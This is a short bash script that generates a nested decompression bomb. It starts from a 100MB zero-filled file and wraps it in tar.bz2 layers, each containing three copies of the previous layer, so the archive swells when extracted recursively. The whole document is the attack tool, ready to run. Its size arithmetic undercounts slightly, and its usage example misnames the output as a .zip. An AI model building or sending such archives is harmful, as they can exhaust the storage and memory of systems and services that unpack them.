#!/bin/bash

# Create a small dummy file (100MB)
dd if=/dev/zero of=dummy.txt bs=100M count=1

get_file_size() {
    local input=$1
    local size=$(stat -f %z "$input" 2>/dev/null || stat -c %s "$input")
    echo $((size / 1024 / 1024))
}

create_zip_bomb() {
    local layers=$1
    local output=$2
    local current_size=100
    local start_dir=$PWD
    
    echo "Creating nested zip bomb with $layers layers..."
    
    work_dir=$(mktemp -d)
    cd "$work_dir" || exit 1
    
    cp "$start_dir/dummy.txt" .
    
    tar cf - dummy.txt | bzip2 -9 > "layer_1.tar.bz2"
    
    for ((layer=2; layer<=layers; layer++)); do
        echo "Creating layer $layer..."
        
        mkdir -p "temp_layer"
        cd "temp_layer"
        
        cp "../dummy.txt" .
        
        for ((copy=1; copy<=3; copy++)); do
            cp "../layer_$((layer-1)).tar.bz2" "copy_${copy}.tar.bz2"
        done
        
        tar cf - dummy.txt *.tar.bz2 | bzip2 -9 > "../layer_${layer}.tar.bz2"
        
        cd ..
        rm -rf "temp_layer"
        rm "layer_$((layer-1)).tar.bz2"
        
        current_size=$((current_size * 3))
        echo "Layer $layer size when fully extracted: $current_size MB"
    done
    
    mv "layer_${layers}.tar.bz2" "$start_dir/$output"
    
    cd "$start_dir" || exit 1
    rm -rf "$work_dir"
    
    echo -e "\nNested zip bomb creation complete!"
    echo "----------------------------------------"
    echo "Final archive file: $(ls -lh $output)"
    echo "Compressed size: $(get_file_size "$output") MB"
    echo "Fully extracted size: $current_size MB"
    echo "Layers: $layers"
    echo "Explosion factor per layer: 3x"
}

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 layers output_archive"
    echo "Example: $0 3 demo.zip (creates zip bomb with 3 layers)"
    exit 1
fi

create_zip_bomb "$1" "$2"

# Remove the dummy file after script completion
rm -f dummy.txt
